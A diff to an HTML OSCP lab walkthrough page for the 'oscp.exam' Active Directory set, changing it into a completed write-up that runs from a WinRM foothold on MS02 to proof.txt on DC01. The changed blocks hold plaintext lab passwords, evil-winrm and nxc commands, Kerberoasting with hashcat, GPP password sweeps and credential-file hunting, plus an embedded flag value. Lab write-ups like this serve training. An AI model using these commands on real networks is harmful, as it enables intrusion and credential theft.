@@ -3,11 +3,11 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>10.10.152.142 — MS02 · OSCP walkthrough</title>
-<meta name="description" content="Interactive walkthrough of the oscp.exam AD set from a position where DC01 is reachable: WinRM foothold, MSSQL ruled out, BloodHound analysis to a single Kerberoastable service account.">
+<title>10.10.131.148 — MS02 · OSCP walkthrough</title>
+<meta name="description" content="Completed walkthrough of the oscp.exam AD set from the MS02 side: celia.almeda WinRM foothold, MSSQL and BloodHound ruled out, then MS01 SYSTEM, the DCC2-cached domain Administrator, a ligolo pivot and proof.txt on DC01.">
 <meta property="og:type" content="article">
-<meta property="og:title" content="10.10.152.142 — MS02 · OSCP walkthrough">
-<meta property="og:description" content="celia.almeda → WinRM → no SeImpersonate, no SQL sysadmin, no ACL edges → Kerberoast sql_svc.">
+<meta property="og:title" content="10.10.131.148 — MS02 · OSCP walkthrough">
+<meta property="og:description" content="celia → WinRM → every MS02 path closed; MS01 SYSTEM → secretsdump → DCC2 Administrator cracked → ligolo → DC01 SYSTEM → proof.txt.">
 <meta name="color-scheme" content="dark light">
 <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>💀</text></svg>">
 <style>
@@ -47,6 +47,8 @@ code{font-family:var(--mono);font-size:.88em}
 .brand .dot{width:9px;height:9px;border-radius:50%;background:var(--acc);box-shadow:0 0 12px var(--acc)}
 .brand .slash{color:var(--dim2);font-weight:400}
 .brand-sub{color:var(--dim);font-weight:500}
+.toplink{padding:6px 11px;border-radius:9px;color:var(--dim);font-size:13.5px;white-space:nowrap}
+.toplink:hover{background:var(--bg2);color:var(--fg);text-decoration:none}
 .search-wrap{position:relative;flex:1;max-width:460px;margin-left:auto}
 #search{
   width:100%;padding:9px 13px;border-radius:10px;border:1px solid var(--line2);
@@ -277,7 +279,7 @@ mark.hit{background:color-mix(in srgb,var(--amber) 45%,transparent);color:inheri
     <div class="card">
       <h3>Progress</h3>
       <div class="progress-track"><div class="progress-fill" id="bar"></div></div>
-      <div class="progress-label"><span><b id="pcount">0 / 9</b> chapters</span><span id="ppct">0%</span></div>
+      <div class="progress-label"><span><b id="pcount">0 / 14</b> chapters</span><span id="ppct">0%</span></div>
     </div>
 
     <div class="nav-title">Chapters</div>
@@ -288,8 +290,13 @@ mark.hit{background:color-mix(in srgb,var(--amber) 45%,transparent);color:inheri
 <a class="nav-item" href="#ch-05" data-target="ch-05"><span class="nav-num">05</span><span class="nav-label">BloodHound</span><input class="nav-check" type="checkbox" data-ch="ch-05" aria-label="Mark BloodHound complete"></a>
 <a class="nav-item" href="#ch-06" data-target="ch-06"><span class="nav-num">06</span><span class="nav-label">What is ruled out</span><input class="nav-check" type="checkbox" data-ch="ch-06" aria-label="Mark What is ruled out complete"></a>
 <a class="nav-item" href="#ch-07" data-target="ch-07"><span class="nav-num">07</span><span class="nav-label">Next actions</span><input class="nav-check" type="checkbox" data-ch="ch-07" aria-label="Mark Next actions complete"></a>
-<a class="nav-item" href="#ch-08" data-target="ch-08"><span class="nav-num">08</span><span class="nav-label">Methodology</span><input class="nav-check" type="checkbox" data-ch="ch-08" aria-label="Mark Methodology complete"></a>
-<a class="nav-item" href="#ch-09" data-target="ch-09"><span class="nav-num">09</span><span class="nav-label">Cheat sheet</span><input class="nav-check" type="checkbox" data-ch="ch-09" aria-label="Mark Cheat sheet complete"></a></nav>
+<a class="nav-item" href="#ch-08" data-target="ch-08"><span class="nav-num">08</span><span class="nav-label">MS01: SYSTEM</span><input class="nav-check" type="checkbox" data-ch="ch-08" aria-label="Mark MS01: SYSTEM complete"></a>
+<a class="nav-item" href="#ch-09" data-target="ch-09"><span class="nav-num">09</span><span class="nav-label">Credentials and cracks</span><input class="nav-check" type="checkbox" data-ch="ch-09" aria-label="Mark Credentials and cracks complete"></a>
+<a class="nav-item" href="#ch-10" data-target="ch-10"><span class="nav-num">10</span><span class="nav-label">Pivot with ligolo-ng</span><input class="nav-check" type="checkbox" data-ch="ch-10" aria-label="Mark Pivot with ligolo-ng complete"></a>
+<a class="nav-item" href="#ch-11" data-target="ch-11"><span class="nav-num">11</span><span class="nav-label">MS02 through the tunnel</span><input class="nav-check" type="checkbox" data-ch="ch-11" aria-label="Mark MS02 through the tunnel complete"></a>
+<a class="nav-item" href="#ch-12" data-target="ch-12"><span class="nav-num">12</span><span class="nav-label">DC01: proof.txt</span><input class="nav-check" type="checkbox" data-ch="ch-12" aria-label="Mark DC01: proof.txt complete"></a>
+<a class="nav-item" href="#ch-13" data-target="ch-13"><span class="nav-num">13</span><span class="nav-label">Methodology</span><input class="nav-check" type="checkbox" data-ch="ch-13" aria-label="Mark Methodology complete"></a>
+<a class="nav-item" href="#ch-14" data-target="ch-14"><span class="nav-num">14</span><span class="nav-label">Cheat sheet</span><input class="nav-check" type="checkbox" data-ch="ch-14" aria-label="Mark Cheat sheet complete"></a></nav>
     <div class="nav-tools">
       <button class="ghost" id="expandAll" type="button">Expand all</button>
       <button class="ghost" id="collapseAll" type="button">Collapse all</button>
@@ -299,11 +306,11 @@ mark.hit{background:color-mix(in srgb,var(--amber) 45%,transparent);color:inheri
     <div class="card" style="margin-top:16px">
       <h3>Target</h3>
       <div class="meta-line"><span>Domain</span><span>oscp.exam</span></div>
-      <div class="meta-line"><span>MS02</span><span>10.10.152.142</span></div>
-      <div class="meta-line"><span>DC01</span><span>10.10.152.140</span></div>
+      <div class="meta-line"><span>MS02</span><span>10.10.131.148 · 10.10.152.142</span></div>
+      <div class="meta-line"><span>DC01</span><span>10.10.131.146 · 10.10.152.140</span></div>
       <div class="meta-line"><span>Domain SID</span><span>…-2610934713-1581164095-2706428072</span></div>
-      <div class="meta-line"><span>Access</span><span>WinRM · celia.almeda</span></div>
-      <div class="meta-line"><span>Result</span><span>MS02 foothold</span></div>
+      <div class="meta-line"><span>Access</span><span>WinRM → SYSTEM → DCC2</span></div>
+      <div class="meta-line"><span>Result</span><span>DC01 proof.txt</span></div>
     </div>
 
     <div class="card">
@@ -317,27 +324,31 @@ mark.hit{background:color-mix(in srgb,var(--amber) 45%,transparent);color:inheri
   <main id="main">
     <section class="hero" id="overview">
       <div class="eyebrow">OSCP lab walkthrough</div>
-      <h1><span class="ip">10.10.152.0/24</span> <span class="name">— oscp.exam · MS02</span></h1>
+      <h1><span class="ip">10.10.131.148</span> <span class="name">— oscp.exam · MS02</span></h1>
       <p class="lede">
-        The same directory as the earlier AD set, seen from a network where the domain controller finally answers directly. Two credentials, four protocols, and every local path closed by the token itself — which leaves one stale service account.
+        The same directory from two positions: one where MS02 is a locked-down member server, and one where a member server's credential cache turns out to hold the domain Administrator. The second one finishes the set.
       </p>
       <div class="badges">
         <span class="badge">Server 2019 · build 19041</span>
         <span class="badge">oscp.exam</span>
-        <span class="badge warn">SMB signing off (MS02)</span>
-        <span class="badge ok">DC01 direct</span>
-        <span class="badge warn">no SeImpersonate</span>
-        <span class="badge warn">sysadmin = 0</span>
+        <span class="badge warn">SMB signing not required</span>
+        <span class="badge ok">MS01 SYSTEM</span>
+        <span class="badge ok">DCC2 → domain Administrator</span>
+        <span class="badge ok">DC01 proof.txt</span>
       </div>
-      <div class="chain"><a class="step" href="#ch-01"><span class="step-num">01</span><span class="step-label">Recon</span><span class="step-desc">no shares, <code>signing:False</code></span></a>
-<a class="step" href="#ch-02"><span class="step-num">02</span><span class="step-label">WinRM</span><span class="step-desc"><code>celia.almeda</code>, medium integrity</span></a>
-<a class="step" href="#ch-03"><span class="step-num">03</span><span class="step-label">MSSQL</span><span class="step-desc">two logins, <code>sysadmin = 0</code></span></a>
-<a class="step" href="#ch-04"><span class="step-num">04</span><span class="step-label">Domain</span><span class="step-desc">DC01 direct, <code>Users</code> share</span></a>
-<a class="step" href="#ch-05"><span class="step-num">05</span><span class="step-label">Graph</span><span class="step-desc">zero outbound ACEs</span></a>
-<a class="step" href="#ch-06"><span class="step-num">06</span><span class="step-label">Ruled out</span><span class="step-desc">seven paths, closed with evidence</span></a>
-<a class="step" href="#ch-07"><span class="step-num">07</span><span class="step-label">Next</span><span class="step-desc">roast <code>sql_svc</code></span></a></div>
+      <div class="chain"><a class="step" href="#ch-01"><span class="step-num">01</span><span class="step-label">Recon</span><span class="step-desc">10.10.152.142 · no shares</span></a>
+<a class="step" href="#ch-02"><span class="step-num">02</span><span class="step-label">celia</span><span class="step-desc">WinRM · no <code>SeImpersonate</code></span></a>
+<a class="step" href="#ch-06"><span class="step-num">03</span><span class="step-label">Ruled out</span><span class="step-desc">MSSQL, ACLs, LAPS</span></a>
+<a class="step" href="#ch-08"><span class="step-num">04</span><span class="step-label">SYSTEM</span><span class="step-desc">MS01 · PrintSpoofer</span></a>
+<a class="step" href="#ch-09"><span class="step-num">05</span><span class="step-label">DCC2</span><span class="step-desc">domain Administrator cracked</span></a>
+<a class="step" href="#ch-10"><span class="step-num">06</span><span class="step-label">Pivot</span><span class="step-desc">ligolo → <code>10.10.131.0/24</code></span></a>
+<a class="step" href="#ch-12"><span class="step-num">07</span><span class="step-label">DC01</span><span class="step-desc"><code>proof.txt</code></span></a></div>
       <div class="flags">
-
+        <div class="flag">
+          <div class="k">proof.txt · DC01</div>
+          <div class="v" data-value="f6a8a664f1a84134905200191b7ee464"><span class="masked">••••••••••••••••••••••••••••••••</span></div>
+          <button class="reveal" type="button">reveal</button>
+        </div>
       </div>
     </section>
 
@@ -421,7 +432,7 @@ notes and is therefore not reconstructed here. <code>eric.wallows</code> is the 
 the same password still works, which is itself a finding.</p>
 <hr />
 <h3>1.3 First contact with MS02</h3>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.10.152.142<span class="w"> </span>-u<span class="w"> </span>web_svc<span class="w"> </span>-p<span class="w"> </span><span class="s1">'Diamond1'</span><span class="w"> </span>--shares
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.10.152.142<span class="w"> </span>-u<span class="w"> </span>web_svc<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;Diamond1&#39;</span><span class="w"> </span>--shares
 </pre></div>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">SMB  10.10.152.142  445  MS02  [*] Windows 10 / Server 2019 Build 19041 x64
                                   (name:MS02) (domain:oscp.exam) (signing:False) (SMBv1:None)
@@ -489,7 +500,7 @@ not the shell — it is proving what the token does <strong>not</strong> contain
 falls here or somewhere else.</p>
 <hr />
 <h3>2.1 The connection</h3>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>evil-winrm<span class="w"> </span>-i<span class="w"> </span><span class="m">10</span>.10.152.142<span class="w"> </span>-u<span class="w"> </span>celia.almeda<span class="w"> </span>-p<span class="w"> </span><span class="s1">'7k8XHk3dMtmpnC7'</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>evil-winrm<span class="w"> </span>-i<span class="w"> </span><span class="m">10</span>.10.152.142<span class="w"> </span>-u<span class="w"> </span>celia.almeda<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;7k8XHk3dMtmpnC7&#39;</span>
 </pre></div>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">Evil-WinRM shell v3.9
 Warning: Remote path completions is disabled due to ruby limitation
@@ -565,11 +576,11 @@ credential hunting:</p>
   was already proven empty on MS01 in the previous leg.</li>
 </ul>
 <p>So the runbook here is files, not memory:</p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nb">type </span><span class="s2">"$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nb">type </span><span class="s2">&quot;$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt&quot;</span>
 <span class="n">cmdkey</span> <span class="p">/</span><span class="n">list</span>
-<span class="n">reg</span> <span class="n">query</span> <span class="s2">"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Unattend"</span> <span class="p">/</span><span class="n">s</span>
+<span class="n">reg</span> <span class="n">query</span> <span class="s2">&quot;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Unattend&quot;</span> <span class="p">/</span><span class="n">s</span>
 <span class="nb">Get-ChildItem</span> <span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">celia</span><span class="p">.</span><span class="n">almeda</span> <span class="n">-Recurse</span> <span class="o">-File</span> <span class="n">-ErrorAction</span> <span class="n">SilentlyContinue</span> <span class="p">|</span>
-  <span class="nb">Where-Object</span> <span class="p">{</span> <span class="nv">$_</span><span class="p">.</span><span class="n">Extension</span> <span class="n">-in</span> <span class="s1">'.txt'</span><span class="p">,</span><span class="s1">'.xml'</span><span class="p">,</span><span class="s1">'.config'</span><span class="p">,</span><span class="s1">'.ini'</span><span class="p">,</span><span class="s1">'.ps1'</span> <span class="p">}</span> <span class="p">|</span>
+  <span class="nb">Where-Object</span> <span class="p">{</span> <span class="nv">$_</span><span class="p">.</span><span class="n">Extension</span> <span class="n">-in</span> <span class="s1">&#39;.txt&#39;</span><span class="p">,</span><span class="s1">&#39;.xml&#39;</span><span class="p">,</span><span class="s1">&#39;.config&#39;</span><span class="p">,</span><span class="s1">&#39;.ini&#39;</span><span class="p">,</span><span class="s1">&#39;.ps1&#39;</span> <span class="p">}</span> <span class="p">|</span>
   <span class="nb">Select-Object</span> <span class="n">-First</span> <span class="n">40</span> <span class="n">FullName</span>
 </pre></div>
 <p>Those are candidates, not results — nothing from that list is yet confirmed, and this chapter does not
@@ -626,12 +637,12 @@ account gives the mirror image:</p>
 <p>Two independent domain accounts, both with a SQL login on the same instance.</p>
 <hr />
 <h3>3.2 The only question that matters</h3>
-<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="k">SELECT</span><span class="w"> </span><span class="k">SYSTEM_USER</span><span class="p">,</span><span class="w"> </span><span class="n">IS_SRVROLEMEMBER</span><span class="p">(</span><span class="s1">'sysadmin'</span><span class="p">);</span>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="k">SELECT</span><span class="w"> </span><span class="k">SYSTEM_USER</span><span class="p">,</span><span class="w"> </span><span class="n">IS_SRVROLEMEMBER</span><span class="p">(</span><span class="s1">&#39;sysadmin&#39;</span><span class="p">);</span>
 </pre></div>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">-   -
 0   0</span></pre></div>
 <p>And as celia:</p>
-<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="k">SQL</span><span class="w"> </span><span class="p">(</span><span class="n">OSCP</span><span class="err">\</span><span class="n">celia</span><span class="p">.</span><span class="n">almeda</span><span class="w">  </span><span class="n">guest</span><span class="o">@</span><span class="n">master</span><span class="p">)</span><span class="o">&gt;</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">SYSTEM_USER</span><span class="p">,</span><span class="w"> </span><span class="n">IS_SRVROLEMEMBER</span><span class="p">(</span><span class="s1">'sysadmin'</span><span class="p">);</span>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="k">SQL</span><span class="w"> </span><span class="p">(</span><span class="n">OSCP</span><span class="err">\</span><span class="n">celia</span><span class="p">.</span><span class="n">almeda</span><span class="w">  </span><span class="n">guest</span><span class="o">@</span><span class="n">master</span><span class="p">)</span><span class="o">&gt;</span><span class="w"> </span><span class="k">SELECT</span><span class="w"> </span><span class="k">SYSTEM_USER</span><span class="p">,</span><span class="w"> </span><span class="n">IS_SRVROLEMEMBER</span><span class="p">(</span><span class="s1">&#39;sysadmin&#39;</span><span class="p">);</span>
 <span class="o">-</span><span class="w">   </span><span class="mi">0</span>
 </pre></div>
 <p>The decisive column is <code>IS_SRVROLEMEMBER('sysadmin')</code> — <strong><code>0</code> for both logins.</strong> Neither is a member of
@@ -750,8 +761,8 @@ that shows up in section 4.4, and it also tells you where to point the clock.</p
 <hr />
 <h3>4.2 What a domain user can read on a DC</h3>
 <p><code>eric.wallows</code> was carried over from the previous leg, and the password still works:</p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.10.152.140<span class="w"> </span>-u<span class="w"> </span>eric.wallows<span class="w"> </span>-p<span class="w"> </span><span class="s1">'EricLikesRunning800'</span>
-nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.10.152.140<span class="w"> </span>-u<span class="w"> </span>eric.wallows<span class="w"> </span>-p<span class="w"> </span><span class="s1">'EricLikesRunning800'</span><span class="w"> </span>--shares
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.10.152.140<span class="w"> </span>-u<span class="w"> </span>eric.wallows<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;EricLikesRunning800&#39;</span>
+nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.10.152.140<span class="w"> </span>-u<span class="w"> </span>eric.wallows<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;EricLikesRunning800&#39;</span><span class="w"> </span>--shares
 </pre></div>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">SMB  10.10.152.140  445  DC01  [*] Windows 10 / Server 2019 Build 17763 x64
                                   (name:DC01) (domain:oscp.exam) (signing:True)
@@ -775,7 +786,7 @@ recorded here as the highest-value unexamined surface.</p>
 work, if any, has to point at MS02.</p>
 <hr />
 <h3>4.3 Collecting the directory</h3>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>bloodhound-python<span class="w"> </span>-d<span class="w"> </span>oscp.exam<span class="w"> </span>-u<span class="w"> </span>celia.almeda<span class="w"> </span>-p<span class="w"> </span><span class="s1">'7k8XHk3dMtmpnC7'</span><span class="w"> </span><span class="se">\</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>bloodhound-python<span class="w"> </span>-d<span class="w"> </span>oscp.exam<span class="w"> </span>-u<span class="w"> </span>celia.almeda<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;7k8XHk3dMtmpnC7&#39;</span><span class="w"> </span><span class="se">\</span>
 <span class="w">  </span>-ns<span class="w"> </span><span class="m">10</span>.10.152.140<span class="w"> </span>-dc<span class="w"> </span>DC01.oscp.exam<span class="w"> </span>-c<span class="w"> </span>All
 </pre></div>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">INFO: Found AD domain: oscp.exam
@@ -803,11 +814,11 @@ needs a name, not an IP, so the collector fell back to NTLM against LDAP. It sti
 but a thinner one: session and local-group collection came back empty across all three computers
 (chapter 05).</p>
 <p>The fix is one line and it is the same fix the Kerberoast needs:</p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nb">echo</span><span class="w"> </span><span class="s1">'10.10.152.140 DC01.oscp.exam oscp.exam'</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sudo<span class="w"> </span>tee<span class="w"> </span>-a<span class="w"> </span>/etc/hosts
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;10.10.152.140 DC01.oscp.exam oscp.exam&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sudo<span class="w"> </span>tee<span class="w"> </span>-a<span class="w"> </span>/etc/hosts
 </pre></div>
 <hr />
 <h3>4.4 Kerberoasting — and the two things that stopped it</h3>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>impacket-GetUserSPNs<span class="w"> </span>oscp.exam/celia.almeda:<span class="s1">'7k8XHk3dMtmpnC7'</span><span class="w"> </span><span class="se">\</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>impacket-GetUserSPNs<span class="w"> </span>oscp.exam/celia.almeda:<span class="s1">&#39;7k8XHk3dMtmpnC7&#39;</span><span class="w"> </span><span class="se">\</span>
 <span class="w">  </span>-dc-ip<span class="w"> </span><span class="m">10</span>.10.152.140<span class="w"> </span>-request
 </pre></div>
 <div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre><span class="plain">ServicePrincipalName   Name     MemberOf  PasswordLastSet              LastLogon
@@ -1181,16 +1192,18 @@ administrator on MS02, and no privilege-escalation primitives exist in this toke
 <p>Both remaining actions are blocked by the same pair of host misconfigurations, not by anything in the
 target:</p>
 <div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="c1">## 1. name resolution - Kerberos needs a name, not an IP</span>
-<span class="nb">echo</span><span class="w"> </span><span class="s1">'10.10.152.140 DC01.oscp.exam oscp.exam'</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sudo<span class="w"> </span>tee<span class="w"> </span>-a<span class="w"> </span>/etc/hosts
+<span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;10.10.152.140 DC01.oscp.exam oscp.exam&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sudo<span class="w"> </span>tee<span class="w"> </span>-a<span class="w"> </span>/etc/hosts
 
-<span class="c1">## 2. clock skew - Kerberos rejects &gt;5 minutes' drift</span>
+<span class="c1">## 2. clock skew - Kerberos rejects &gt;5 minutes&#39; drift</span>
 sudo<span class="w"> </span>ntpdate<span class="w"> </span>-u<span class="w"> </span><span class="m">10</span>.10.152.140
 date<span class="w"> </span>-u
 </pre></div>
 <p>Until both are fixed, every roast fails with <code>KRB_AP_ERR_SKEW</code> and every collection silently degrades to
 NTLM — which is exactly what happened in chapter 04, and why the session data in chapter 05 is empty.</p>
 <hr />
-<h3>6.5 Status</h3>
+<h3>6.5 Status at the end of this pass</h3>
+<p>The set is completed in chapters 08–12 from a different position; the table below is the
+<code>10.10.152.x</code> position as it stood.</p>
 <table>
 <thead>
 <tr>
@@ -1247,8 +1260,9 @@ NTLM — which is exactly what happened in chapter 04, and why the session data 
 been done and closed; what remains requires an account we do not have, and chapter 07 is where that
 account is expected to come from.</p></div></section>
 <section class="chapter" id="ch-07" data-title="Next actions"><div class="ch-head"><span class="ch-num">07</span><div class="ch-title"><h2>Next actions</h2><p class="ch-sub">Why <code>sql_svc</code>, and what runs next</p></div><button class="ghost copyall" type="button">Copy commands</button></div><div class="content"><blockquote>
-<p><strong>Not yet executed.</strong> Everything on this page is the plan that follows from chapters 01–06. No result
-is claimed here. When these run, this chapter is replaced with what actually happened.</p>
+<p><strong>Superseded — this plan was never executed.</strong> It belongs to the <code>10.10.152.x</code> position. The set
+was completed from <code>10.10.131.x</code> through MS01's cached domain Administrator credential
+(chapters 08–12), which made the <code>sql_svc</code> route unnecessary.</p>
 </blockquote>
 <p>With every ACL path closed and every local token exhausted, the only lever left is a credential we do
 not have. Three independent lines of evidence name the same one.</p>
@@ -1282,7 +1296,7 @@ domain user — it is an account whose privileges on MS02 are unknown and may in
 <strong>2022-12-05</strong>, on a service account, which is the profile that cracks.</p>
 <hr />
 <h3>7.2 Action 1 — Roast it</h3>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>impacket-GetUserSPNs<span class="w"> </span>oscp.exam/celia.almeda:<span class="s1">'7k8XHk3dMtmpnC7'</span><span class="w"> </span><span class="se">\</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>impacket-GetUserSPNs<span class="w"> </span>oscp.exam/celia.almeda:<span class="s1">&#39;7k8XHk3dMtmpnC7&#39;</span><span class="w"> </span><span class="se">\</span>
 <span class="w">  </span>-dc-ip<span class="w"> </span><span class="m">10</span>.10.152.140<span class="w"> </span>-request<span class="w"> </span>-outputfile<span class="w"> </span>kerb.txt
 
 hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">13100</span><span class="w"> </span>kerb.txt<span class="w"> </span>/usr/share/wordlists/rockyou.txt
@@ -1291,14 +1305,14 @@ hashcat<span class="w"> </span>-m<span class="w"> </span><span class="m">13100</
 chapter 04.</p>
 <p>If it cracks, the next test is whether <code>sql_svc</code> can log in over WinRM or SMB, and whether its token
 carries <code>SeImpersonate</code>:</p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>nxc<span class="w"> </span>winrm<span class="w"> </span><span class="m">10</span>.10.152.142<span class="w"> </span>-u<span class="w"> </span>sql_svc<span class="w"> </span>-p<span class="w"> </span><span class="s1">'&lt;cracked&gt;'</span>
-nxc<span class="w"> </span>smb<span class="w">   </span><span class="m">10</span>.10.152.142<span class="w"> </span>-u<span class="w"> </span>sql_svc<span class="w"> </span>-p<span class="w"> </span><span class="s1">'&lt;cracked&gt;'</span><span class="w"> </span>--shares
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>nxc<span class="w"> </span>winrm<span class="w"> </span><span class="m">10</span>.10.152.142<span class="w"> </span>-u<span class="w"> </span>sql_svc<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;&lt;cracked&gt;&#39;</span>
+nxc<span class="w"> </span>smb<span class="w">   </span><span class="m">10</span>.10.152.142<span class="w"> </span>-u<span class="w"> </span>sql_svc<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;&lt;cracked&gt;&#39;</span><span class="w"> </span>--shares
 </pre></div>
 <p><code>SeImpersonate</code> on that account, plus a service already running as it, is the SYSTEM path on MS02.</p>
 <hr />
 <h3>7.3 Action 2 — The share nobody has opened</h3>
 <p><code>Users</code> is not a default share on a domain controller, and <code>eric.wallows</code> can read it.</p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>smbclient<span class="w"> </span>//10.10.152.140/Users<span class="w"> </span>-U<span class="w"> </span><span class="s1">'oscp.exam%EricLikesRunning800'</span><span class="w"> </span>-c<span class="w"> </span><span class="s1">'recurse ON; ls'</span>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>smbclient<span class="w"> </span>//10.10.152.140/Users<span class="w"> </span>-U<span class="w"> </span><span class="s1">&#39;oscp.exam%EricLikesRunning800&#39;</span><span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;recurse ON; ls&#39;</span>
 </pre></div>
 <p>This is the highest-value <strong>unexamined</strong> surface in the engagement: a custom share holding user data,
 mounted on the DC, readable by a plain domain user. Scripts, config files and second credentials are the
@@ -1306,8 +1320,8 @@ usual occupants.</p>
 <hr />
 <h3>7.4 Action 3 — GPP sweep</h3>
 <p>Cheap, and it fails closed:</p>
-<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.10.152.140<span class="w"> </span>-u<span class="w"> </span>eric.wallows<span class="w"> </span>-p<span class="w"> </span><span class="s1">'EricLikesRunning800'</span><span class="w"> </span>-M<span class="w"> </span>gpp_password
-nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.10.152.140<span class="w"> </span>-u<span class="w"> </span>eric.wallows<span class="w"> </span>-p<span class="w"> </span><span class="s1">'EricLikesRunning800'</span><span class="w"> </span>-M<span class="w"> </span>gpp_autologin
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>nxc<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.10.152.140<span class="w"> </span>-u<span class="w"> </span>eric.wallows<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;EricLikesRunning800&#39;</span><span class="w"> </span>-M<span class="w"> </span>gpp_password
